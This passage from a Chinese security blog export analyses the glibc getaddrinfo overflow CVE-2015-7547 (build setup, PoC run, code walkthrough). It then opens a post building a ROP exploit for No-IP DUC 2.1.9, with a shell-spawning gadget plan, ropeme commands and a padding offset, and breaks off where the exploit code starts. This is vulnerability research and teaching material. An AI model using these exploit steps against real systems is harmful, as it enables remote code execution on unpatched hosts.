href=\"http://blog.csdn.net/qiaoliang328/article/details/4729869\" target=\"_blank\" rel=\"external\">AF_UNSPEC</a> 参数进行DNS查询，调用  NSS 模块 libnss_dns.so.2 的 send_dg(UDP) 和 send_vc(TCP) 函数后会引发溢出。（如果是 AF_UNSPEC ，仅调用 gethostbyname4_r 函数）。</p>\n<p>使用 <a href=\"http://blog.csdn.net/qiaoliang328/article/details/4729869\" target=\"_blank\" rel=\"external\">AF_UNSPEC</a> 参数会触发低级解析代码并发查询 A(ipv4) 和 AAAA(ipv4)。由于用于查询的缓冲区管理不当，返回响应结果时，超出 _nss_dns_gethostbyname4_r 中分配的缓冲区。 </p>\n<h1 id=\"II、实验环境\"><a href=\"#II、实验环境\" class=\"headerlink\" title=\"II、实验环境\"></a>II、实验环境</h1><h2 id=\"①-操作系统和-glibc-版本\"><a href=\"#①-操作系统和-glibc-版本\" class=\"headerlink\" title=\"① 操作系统和 glibc 版本\"></a>① 操作系统和 glibc 版本</h2><ul>\n<li>操作系统：Ubuntu 15.04</li>\n<li>调试器：GDB</li>\n<li>glibc版本：glibc2.20<br><font color=\"red\"> Tips：</font>在 Ubuntu 14.04 编译安装 glibc2.20 后，运行最基本的 helloworld 程序，都会出现段错误。我现在还不太清楚原因，如果读者和我有相同的错误，建议使用 Ubuntu 15.04 。</li>\n</ul>\n<h2 id=\"②-glibc-编译安装\"><a href=\"#②-glibc-编译安装\" class=\"headerlink\" title=\"② glibc 编译安装\"></a>② glibc 编译安装</h2><h3 id=\"1-普通命令行安装\"><a href=\"#1-普通命令行安装\" class=\"headerlink\" title=\"(1)普通命令行安装\"></a>(1)普通命令行安装</h3><p>在ubuntu系统下，只需要执行源码和调试符的命令之后就可以使用gdb对glibc的跟踪调试，安装指令如下：<br> <figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">sudo</span> apt-<span class=\"meta\">get</span> install libc6-<span class=\"keyword\">dbg</span></div><div class=\"line\"><span class=\"symbol\">sudo</span> apt-<span class=\"meta\">get</span> source libc6-dev</div></pre></td></tr></table></figure></p>\n<p>但是因为系统自带的 glibc 是 <font color=\"red\">发行版</font> 的，所以在编译的是时候选用了优化参数 <font color=\"red\">-O2</font>,所以在调试的过程中会出现 <font color=\"red\">变量被优化无法读取 </font>以及 <font color=\"red\">代码运行的时候与源码的行数对不上 </font> 的情况。</p>\n<p>所以需要自己编译一个可调试且没有过度优化的 glibc 进行调试。</p>\n<h3 id=\"2-手动编译安装\"><a href=\"#2-手动编译安装\" class=\"headerlink\" title=\"(2)手动编译安装\"></a>(2)手动编译安装</h3><p>前文介绍，glibc 版本大于 2.9 都存在漏洞，选择你喜欢的一个版本，我选择的是 <a href=\"http://mirror.hust.edu.cn/gnu/libc/\" target=\"_blank\" rel=\"external\">glibc 2.20</a>。<br><a href=\"http://blog.csdn.net/mycwq/article/details/38557997\" target=\"_blank\" rel=\"external\">编译安装 glibc 教程</a>，相关教程可自行 google 。</p>\n<p>需要注意的是在进行 configure 时需要设置一些特殊的参数。如果需要调试宏可以添加 -gdwarf-2,glibc 无法使用 -O0 编译，不过 -O1 也够用了。<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar zxvf glibc-<span class=\"number\">2.20</span>.tar.gz </div><div class=\"line\">sudo mv glibc-<span class=\"number\">2.20</span> /<span class=\"keyword\">opt</span>/</div><div class=\"line\"><span class=\"keyword\">cd</span> /<span class=\"keyword\">opt</span>/glibc-<span class=\"number\">2.20</span></div><div class=\"line\">sudo <span class=\"built_in\">mkdir</span> build &amp;&amp; <span class=\"keyword\">cd</span> build</div><div class=\"line\">sudo /<span class=\"keyword\">opt</span>/glibc220/configure --prefix=/usr/local/glibc220/ --enable-<span class=\"keyword\">debug</span> CFLAGS=<span class=\"string\">\"-g -O1\"</span> CPPFLAGS=<span class=\"string\">\"-g -O1\"</span></div><div class=\"line\">sudo <span class=\"keyword\">make</span></div><div class=\"line\">sudo <span class=\"keyword\">make</span> install</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">Tips：</font> CFLAGS 和 CPPFLAGS 中的 “-O1” ，前一个大写字母 O，紧跟着是数字 1。</p>\n<h2 id=\"③-配置本地-DNS-服务器\"><a href=\"#③-配置本地-DNS-服务器\" class=\"headerlink\" title=\"③ 配置本地 DNS 服务器\"></a>③ 配置本地 DNS 服务器</h2><p>运行poc的python服务器之前，修改/etc/resolv.conf配置，将域名服务器改为127.0.0.1，本机器会无法正常访问网页。<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">nameserver</span> 127<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"III、运行-POC\"><a href=\"#III、运行-POC\" class=\"headerlink\" title=\"III、运行 POC\"></a>III、运行 POC</h1><h2 id=\"①-POC-分析\"><a href=\"#①-POC-分析\" class=\"headerlink\" title=\"① POC 分析\"></a>① POC 分析</h2><p>在google给出的 <a href=\"https://github.com/fjserna/CVE-2015-7547\" target=\"_blank\" rel=\"external\">poc</a>（该poc只能造成溢出，并不能利用）的基础上进行调试。<br>该 POC 文件包括两部分：</p>\n<ul>\n<li>.c文件：调用 getaddrinfo 解析 “foo.bar.google.com”。</li>\n<li>.py文件：绑定 53 端口，模拟 DNS 服务器对 getaddrinfo 的请求进行响应。<h2 id=\"②-运行-python-脚本\"><a href=\"#②-运行-python-脚本\" class=\"headerlink\" title=\"② 运行 python 脚本\"></a>② 运行 python 脚本</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo python CVE<span class=\"number\">-2015</span><span class=\"number\">-7547</span>-poc.py</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2v4kq1trej30k800o0sv.jpg\" alt=\"\"><br>服务器端等待客户端发送请求</p>\n<h2 id=\"③-运行客户端程序\"><a href=\"#③-运行客户端程序\" class=\"headerlink\" title=\"③ 运行客户端程序\"></a>③ 运行客户端程序</h2><h3 id=\"1-使用调试版本glibc编译POC\"><a href=\"#1-使用调试版本glibc编译POC\" class=\"headerlink\" title=\"(1) 使用调试版本glibc编译POC\"></a>(1) 使用调试版本glibc编译POC</h3><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -o client CVE-<span class=\"number\">2015</span>-<span class=\"number\">7547</span>-client.c -Wl,-rpath /usr/local/glibc220/<span class=\"class\"><span class=\"keyword\">lib</span></span></div></pre></td></tr></table></figure>\n<p>通过ldd指令可以看到，确实使用了刚编译的glibc。<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2v4a3gd36j30k602rwfk.jpg\" alt=\"\"></p>\n<h3 id=\"2-运行\"><a href=\"#2-运行\" class=\"headerlink\" title=\"(2) 运行\"></a>(2) 运行</h3><figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./<span class=\"keyword\">client</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2v4bqiu9gj30k6015dg2.jpg\" alt=\"\"><br>出现段错，说明成功溢出.</p>\n<h3 id=\"3-GDB调试\"><a href=\"#3-GDB调试\" class=\"headerlink\" title=\"(3) GDB调试\"></a>(3) GDB调试</h3><p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2v4j5gi7rj30k60jkqdk.jpg\" alt=\"\"></p>\n<h1 id=\"IV、触发流程\"><a href=\"#IV、触发流程\" class=\"headerlink\" title=\"IV、触发流程\"></a>IV、触发流程</h1><h2 id=\"①-库函数调用流程\"><a href=\"#①-库函数调用流程\" class=\"headerlink\" title=\"① 库函数调用流程\"></a>① 库函数调用流程</h2><p>getaddrinfo 解析 URL 时，库函数的调用流程如下：<br> <img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2v3eqmk5zj314i12iq9c.jpg\" alt=\"\"></p>\n<ul>\n<li><p>首先从getaddrinfo函数开始，getaddrinfo函数在resolv/nss_dns/dns-host.c中<br>_nss_dns_gethostbyname4_r 会调用 alloca 在栈上分配了2048个字节。</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">host_buffer.buf = orig_host_buffer = (querybuf *) alloca (<span class=\"number\">2048</span>);</div><div class=\"line\">... 省略部分代码 ...</div><div class=\"line\">int n = __libc_res_nsearch (<span class=\"variable\">&amp;_res</span>, name, C_IN, T_UNSPEC, host_buffer.buf-&gt;buf, <span class=\"number\">2048</span>, <span class=\"variable\">&amp;host_buffer</span>.ptr,<span class=\"variable\">&amp;ans2p</span>, <span class=\"variable\">&amp;nans2p</span>, <span class=\"variable\">&amp;resplen2</span>);</div></pre></td></tr></table></figure>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f2w022aaotj30k7065gnr.jpg\" alt=\"\"><br>alloca 函数在栈分配 2048 个字节，用于存放 DNS 服务器的响应数据。__libc_res_nsearch 函数还传递了ans2p，nans2p，resplen2 三个参数，存放 DNS 服务器的响应数据。ans2p 用于返回存放第二份响应数据包缓冲区地址，nans2p 返回存放第二份响应数据包的扩充缓冲区的大小，resplen2 返回第二份响应数据包数据包的大小。函数的返回值是第一份响应数据包的大小。<br>getaddrinfo 函数若传递 AF_UNSPEC 参数，会同时进行 IPv4,IPv6 查询，分配组建 IPv4 和 IPv6 的数据包发送和接受。</p>\n</li>\n<li><p><strong>libc_res_nsearch 继续调用 </strong>libc_res_nquery 函数，<strong>libc_res_nquery 在调用 </strong>libc_res_nsend 函数。__libc_res_nsend 用于发送和接受DNS相关的数据包。</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">__libc_res_nsend(<span class=\"name\">statp</span>, query1, nquery1, query2, nquery2, answer, anslen, answerp, answerp2, nanswerp2, resplen2)</div></pre></td></tr></table></figure>\n</li>\n<li><p>__libc_res_nsend 先后调用 send_dg 和 send_vc 函数和 DNS 服务器交互，TCP 场景下调用 send_vc，UDP 调用 send_dg。</p>\n</li>\n</ul>\n<p><font color=\"red\">Tips：</font>函数位置在 库函数调用流程图 中都有标注。</p>\n<h2 id=\"②-漏洞成因\"><a href=\"#②-漏洞成因\" class=\"headerlink\" title=\"② 漏洞成因\"></a>② 漏洞成因</h2><h3 id=\"1-深入分析-send-dg-函数。\"><a href=\"#1-深入分析-send-dg-函数。\" class=\"headerlink\" title=\"(1) 深入分析 send_dg 函数。\"></a>(1) 深入分析 send_dg 函数。</h3><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">send_dg(<span class=\"name\">statp</span>, buf, buflen, buf2, buflen2, <span class=\"symbol\">&amp;ans</span>, <span class=\"symbol\">&amp;anssiz</span>, <span class=\"symbol\">&amp;terrno</span>, ns, <span class=\"symbol\">&amp;v_circuit</span>, <span class=\"symbol\">&amp;gotsomewhere</span>, ansp, ansp2, nansp2, resplen2)</div></pre></td></tr></table></figure>\n<p>send_dg 首先调用 __sendmmsg 发送 buf, buflen, buf2, buflen2中的数据包到 DNS 服务器。buf, buflen, buf2, buflen2 是对应的查询消息。再调用 recvfrom 接受从 DNS 的响应包，而问题就出现在这段代码。</p>\n<h3 id=\"2-接着分析-send-dg-函数中-recvfrom-的使用\"><a href=\"#2-接着分析-send-dg-函数中-recvfrom-的使用\" class=\"headerlink\" title=\"(2) 接着分析 send_dg 函数中 recvfrom 的使用\"></a>(2) 接着分析 send_dg 函数中 recvfrom 的使用</h3><p>thisansp 变量标识接受数据缓冲区的地址<br>thisanssizp 变量标识接受数据缓冲区的大小。<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">*thisresplenp = recvfrom(<span class=\"name\">pfd</span>[<span class=\"number\">0</span>].fd, (<span class=\"name\">char*</span>)*thisansp, *thisanssizp, <span class=\"number\">0</span>, (<span class=\"name\">struct</span> sockaddr *)&amp;from, &amp;fromlen);</div></pre></td></tr></table></figure></p>\n<h3 id=\"3-继续分析-send-dg-对-thisansp，thisanssizp-变量的处理逻辑。\"><a href=\"#3-继续分析-send-dg-对-thisansp，thisanssizp-变量的处理逻辑。\" class=\"headerlink\" title=\"(3) 继续分析 send_dg 对 thisansp，thisanssizp 变量的处理逻辑。\"></a>(3) 继续分析 send_dg 对 thisansp，thisanssizp 变量的处理逻辑。</h3><p>第一次收到数据包，使用之前在栈上分配的 2048 个字节，代码处理如下：<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2w0nr4ehrj30k903mjsj.jpg\" alt=\"\"></p>\n<p>当第二次收到数据包时，处理如下(/opt/glibc220/resolv/nss_dns/res_send.c:line 1198 ~ 1247)：<br><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> ((recvresp1 | recvresp2) == <span class=\"number\">0</span> || <span class=\"attr\">buf2</span> == NULL) &#123;</div><div class=\"line\">    <span class=\"attr\">thisanssizp</span> = anssizp;</div><div class=\"line\">    <span class=\"attr\">thisansp</span> = anscp ?: ansp;</div><div class=\"line\">    <span class=\"keyword\">assert</span> (anscp != NULL || <span class=\"attr\">ansp2</span> == NULL);</div><div class=\"line\">    <span class=\"attr\">thisresplenp</span> = &amp;resplen;</div><div class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">    <span class=\"comment\">/* 第二次接收到数据包时，进入此分支 */</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (*anssizp != MAXPACKET) &#123;</div><div class=\"line\">    <span class=\"comment\">/* 判断第一个缓冲区长度anssizp 是否是65536，</span></div><div class=\"line\">    如果不是，表示2048个缓冲区在接受第一个数据包的时候足够，</div><div class=\"line\">    因此第二个缓冲区继续使用2048个缓冲区的剩余部分 */</div><div class=\"line\">       </div><div class=\"line\">        *<span class=\"attr\">anssizp2</span> = orig_anssizp - resplen;</div><div class=\"line\">        *<span class=\"attr\">ansp2</span> = *ansp + resplen;</div><div class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">    <span class=\"comment\">/* anssizp 等于65536，说明之前的接受数据包大于2048个字节，</span></div><div class=\"line\">    栈中分配的空间不足以存放，但是第二次查询的数据有可能小于2048，</div><div class=\"line\">    因此尝试使用栈中的内存保存响应包 */</div><div class=\"line\"></div><div class=\"line\">        *<span class=\"attr\">anssizp2</span> = orig_anssizp;</div><div class=\"line\">        *<span class=\"attr\">ansp2</span> = *ansp;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"comment\">/* 修改thisanssizp thisansp thisresplenp，</span></div><div class=\"line\">    分别表示调用recvfrom函数接受缓冲区的大小、接受缓冲区地址、接受到的数据包长度 */</div><div class=\"line\">    <span class=\"attr\">thisanssizp</span> = anssizp2;  </div><div class=\"line\">    <span class=\"attr\">thisansp</span> = ansp2;</div><div class=\"line\">    <span class=\"attr\">thisresplenp</span> = resplen2;</div><div class=\"line\"></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> (*thisanssizp &lt; maxpacket</div><div class=\"line\">    <span class=\"comment\">/* 判断接受的数据包，thisanssizp 是否足够存放，</span></div><div class=\"line\">    如果不够的话，调用malloc 从堆上分配65536个字节，用来存放接受到的数据包 */</div><div class=\"line\">    &amp;&amp; anscp &amp;&amp; (ioctl (pfd[<span class=\"number\">0</span>].fd, FIONREAD, thisresplenp) &lt; <span class=\"number\">0</span> || *thisanssizp &lt; *thisresplenp)) &#123;</div><div class=\"line\"></div><div class=\"line\">    u_char *<span class=\"attr\">newp</span> = malloc (MAXPACKET);</div><div class=\"line\">    <span class=\"keyword\">if</span> (newp != NULL) &#123;</div><div class=\"line\">        *<span class=\"attr\">anssizp</span> = MAXPACKET;    <span class=\"comment\">/* 修改anssizp 变量表示已经从堆上分配了内存 */</span></div><div class=\"line\">        *<span class=\"attr\">thisansp</span> = <span class=\"attr\">ans</span> = newp;     <span class=\"comment\">/* 修改thisansp 变量，本地recvfrom使用新分配的内存进行存放 */</span></div><div class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"attr\">thisansp</span> == ansp2)</div><div class=\"line\">            *<span class=\"attr\">ansp2_malloced</span> = <span class=\"number\">1</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">处理第二次接收到的数据包时，存在逻辑漏洞。</font><br>u_char *newp = malloc (MAXPACKET); 在堆上分配了 65536 字节区域，但</p>\n<ul>\n<li>在使用新分配的内存是，修改了 thisansp 变量，但是没有修改 thisanssizp  变量为新分配的malloc内存的大小。</li>\n<li>更新了 anssizp 标识第一个缓存区的大小，但是没有更新 ansp 变量，ansp 还是指向之前在栈上分配的 2048 个字节。</li>\n</ul>\n<h2 id=\"③-漏洞触发场景\"><a href=\"#③-漏洞触发场景\" class=\"headerlink\" title=\"③ 漏洞触发场景\"></a>③ 漏洞触发场景</h2><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2v6vl5hvej312w11qwie.jpg\" alt=\"\"></p>\n<ul>\n<li>程序调用 getaddrinfo 函数，传递 AF_UNSPEC 参数进行 DNS 查询，并发查询 IPv4,IPv6。</li>\n<li>第一次的DNS响应数据包是 2048，正好使用完了在栈上分配的 2048 个字节。<ol>\n<li>执行路径：① ② ⑥ ⑧ ;</li>\n<li>输入：服务器发送 2048 字节的响应包； ansp = stackbuffer; anssizp = 2048</li>\n<li>影响变量：thisanssizp = 2048; thisansp = ansp = stackbuffer; thisresplenp = 2048;</li>\n<li>结果：thisresplenp = recvfrom(thisansp, *thisanssizp) ; // recvfrom(stackbuffer, 2048);</li>\n</ol>\n</li>\n<li>接受第二次 DNS 响应数据包，由于之前第一个数据包已经使用完 2048 个字节，所以代码会走到 malloc 流程从堆上分配内存，但是由于前面提到的 bug，thisanssizp 没有被更新，而 thisanssizp 在这种场景下为 0，会导致 recvfrom返回失败，导致 send_dg 直接退出。这个时候，ansp 指向栈上的 2048 个内存区，但是 anssizp 被修改为65536。<ol>\n<li>执行路径：① ③ ④ ⑥ ⑦ ⑧;</li>\n<li>输入：服务器发送 10000 字节的数据，ansp = stackbuffer; anssizp = 2048;</li>\n<li>影响变量：thisanssizp = 0; <em>thisansp = stackbuffer; </em>thisresplenp = 10000</li>\n<li>结果： heapbuffer = malloc(MAXPACKET); <em>anssizp = MAXPACKET; </em>thisansp = heapbuffer;<br><em>thisresplenp = recvfrom(thisansp, </em>thisanssizp) ; // recvfrom(heapbuffer, MAXPACKET);      </li>\n</ol>\n</li>\n<li>send_dg 再次被调用，这个时候接受第三个 DNS 响应数据包，ansp 指向栈上的 2048 个内存区，anssizp 被修改为65536. 这个时候如果接受超过 2048 个数据包，会导致栈溢出。因此攻击者可以构造一个 65536 的数据包，前面 2048 个字节是正规的 DNS 数据，后面 63487 个字节利用栈溢出执行自己的代码。<ol>\n<li>执行路径：① ② ⑥ ⑧ ;</li>\n<li>输入：服务器发送&gt;2048字节数据，ansp = stackbuffer, anssizp = MAXPACKET;</li>\n<li>影响变量：thisanssizp = MAXPACKET, *thisansp = ansp = stackuffer;</li>\n<li>结果： <em>thisresplenp = recvfrom(thisansp, </em>thisanssizp) ; // recvfrom( stackbuffer, MAXPACKET);<br>MAXPACKET = 65535 &gt; 2048 造成栈溢出。</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"https://www.exploit-db.com/exploits/39454/\" target=\"_blank\" rel=\"external\">glibc - getaddrinfo Stack-Based Buffer Overflow</a><br><a href=\"https://github.com/fjserna/CVE-2015-7547\" target=\"_blank\" rel=\"external\">Proof of concept for CVE-2015-7547</a><br><a href=\"https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html\" target=\"_blank\" rel=\"external\">glibc getaddrinfo() stack-based buffer overflow</a><br><a href=\"http://drops.wooyun.org/papers/13040\" target=\"_blank\" rel=\"external\">CVE-2015-7547简单分析与调试</a><br><a href=\"http://blog.knownsec.com/2016/02/linux-glibc-cve-2015-7547-analysis/\" target=\"_blank\" rel=\"external\">Linux Glibc 函数库漏洞分析(CVE-2015-7547)</a><br><a href=\"http://blog.nsfocus.net/cve-2015-7547-vulnerability-analysis/\" target=\"_blank\" rel=\"external\">CVE-2015-7547的漏洞分析</a><br><a href=\"http://gold.xitu.io/entry/56c6b85edf0eea00505892c0\" target=\"_blank\" rel=\"external\">解读 | 一个 Linux 漏洞火了，什么情况？严重么？</a><br><a href=\"http://blog.csdn.net/mycwq/article/details/38557997\" target=\"_blank\" rel=\"external\">linux下编译安装glibc</a></p>\n"},{"title":"构造 NO IP(DUC) ROP exploit","url":"http://huirong.github.io/2016/03/29/NoIP-StackOverflow-ROP/","content":"<p><a href=\"http://huirong.github.io/2016/03/28/NoIP-StackOverflow/\">No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析</a>，分析了漏洞成因和基本 POC 构造。<br>一般情况，应用程序的栈和堆是不可执行的，本文旨在编写通用的exploit。</p>\n<h1 id=\"I、实验环境\"><a href=\"#I、实验环境\" class=\"headerlink\" title=\"I、实验环境\"></a>I、实验环境</h1><ul>\n<li>操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2</li>\n<li>调试工具：edb-debugger</li>\n<li>ROP gadget 搜索工具：ropeme</li>\n<li>应用程序：<a href=\"https://www.exploit-db.com/apps/3b0f5f2ff8637c73ab337be403252a60-noip-duc-linux.tar.gz\" target=\"_blank\" rel=\"external\">No-IP</a></li>\n</ul>\n<h1 id=\"II、exploit-结构\"><a href=\"#II、exploit-结构\" class=\"headerlink\" title=\"II、exploit 结构\"></a>II、exploit 结构</h1><p>关于 ROP exploit 详细构造过程，请参考<a href=\"http://huirong.github.io/2016/03/11/ROP-exploit/\">ROP exploit 编写</a>。</p>\n<h2 id=\"①-参数分布\"><a href=\"#①-参数分布\" class=\"headerlink\" title=\"① 参数分布\"></a>① 参数分布</h2><p>Linux 系统调用参数存放于 ebx,edx,esi,edi，因此</p>\n<ul>\n<li>ebx：存放字符串”/bin/sh” 地址</li>\n<li>ecx：存放指向 argp 数组的指针</li>\n<li>edx：存放指向 envp 数组的指针</li>\n<li>eax：系统调用号 0xb</li>\n</ul>\n<h2 id=\"②-exploit-结构\"><a href=\"#②-exploit-结构\" class=\"headerlink\" title=\"② exploit 结构\"></a>② exploit 结构</h2><ol>\n<li>清零 eax</li>\n<li>ecx 设置为 argp 数组指针</li>\n<li>edx 设置为 anvp 数组指针</li>\n<li>将 “/bin/sh” 地址存放于 ebx</li>\n<li>eax 值加 0xb</li>\n<li>执行系统调用,int 0x80</li>\n<li>eax 清零</li>\n<li>eax 加 1</li>\n<li>ebx 清零</li>\n<li><p>执行系统调用，int 0x1</p>\n<p><font color=\"red\">Tips：</font> 7、8、9、10 正常退出shellcode，尽管没有这几个 gadgets，shellcode 依然可以新建shell，但要具有良好的编写习惯。<br>详细请参考 <a href=\"http://www.vividmachines.com/shellcode/shellcode.html\" target=\"_blank\" rel=\"external\">Shellcoding for Linux and Windows Tutorial</a></p>\n</li>\n</ol>\n<h1 id=\"III、搜索-ROP-gadgets\"><a href=\"#III、搜索-ROP-gadgets\" class=\"headerlink\" title=\"III、搜索 ROP gadgets\"></a>III、搜索 ROP gadgets</h1><h2 id=\"①-查看-noip-关联的库\"><a href=\"#①-查看-noip-关联的库\" class=\"headerlink\" title=\"① 查看 noip 关联的库\"></a>① 查看 noip 关联的库</h2><ul>\n<li><p>查看 noip 进程号pid </p>\n <figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ps</span> -aux | <span class=\"keyword\">grep</span> noip</div></pre></td></tr></table></figure>\n<p> <img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2excag2rij30r206ntc5.jpg\" alt=\"\"></p>\n<p> 进程 pid : 6589</p>\n</li>\n<li><p>查看对应 pid 的映射表maps<br> cat /proc/pid/maps</p>\n <figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">cat</span> /<span class=\"meta\">proc</span>/<span class=\"number\">6589</span>/maps</div></pre></td></tr></table></figure>\n<p> <img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2exjrkobmj30pd0f1do1.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<h2 id=\"②-调用-ropeme-generate-函数\"><a href=\"#②-调用-ropeme-generate-函数\" class=\"headerlink\" title=\"② 调用 ropeme generate 函数\"></a>② 调用 ropeme generate 函数</h2><p>系统库函数 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so 包含丰富的 gadgets，足够组成 ROP exploit，因此选择搜索库函数 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so。</p>\n <font color=\"red\">此库函数的起始地址 ：0xb7e15000需用此地址计算 gadgets 的绝对地址。</font>\n\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">generate /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">i686</span>/<span class=\"title\">cmov</span>/<span class=\"title\">libc</span>-2.19.<span class=\"title\">so</span> 4</span></div></pre></td></tr></table></figure>\n<p> <img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f2exwnv2q3j30lw08cmzi.jpg\" alt=\"\"></p>\n<h2 id=\"③-搜索-xor-eax-eax-ret\"><a href=\"#③-搜索-xor-eax-eax-ret\" class=\"headerlink\" title=\"③ 搜索 xor eax,eax;ret;\"></a>③ 搜索 xor eax,eax;ret;</h2><figure class=\"highlight erlang\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">search <span class=\"keyword\">xor</span> eax <span class=\"comment\">%</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f2exzlzap0j30kb0entcl.jpg\" alt=\"\"></p>\n<p>结果集中的所有 gadgets 地址都是相对地址</p>\n<font color=\"red\">绝对地址 = 相对地址 + 库函数起始地址</font> \n\n<p>选取 0x2ed2cL: xor eax eax ;;<br>绝对地址 ：0xb7e15000 + 0x2ed2c = 0xb7e43d2c</p>\n<h2 id=\"④-搜索其他-gadgets，并生成-exploit\"><a href=\"#④-搜索其他-gadgets，并生成-exploit\" class=\"headerlink\" title=\"④ 搜索其他 gadgets，并生成 exploit\"></a>④ 搜索其他 gadgets，并生成 exploit</h2><p>以同样的方式搜索其他 gadgets ，并计算绝对地址。</p>\n<p>前文介绍，返回地址的偏移量为：296，因此要先填充 296 个 ‘\\x90’。<br>最后 exploit：<br><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div 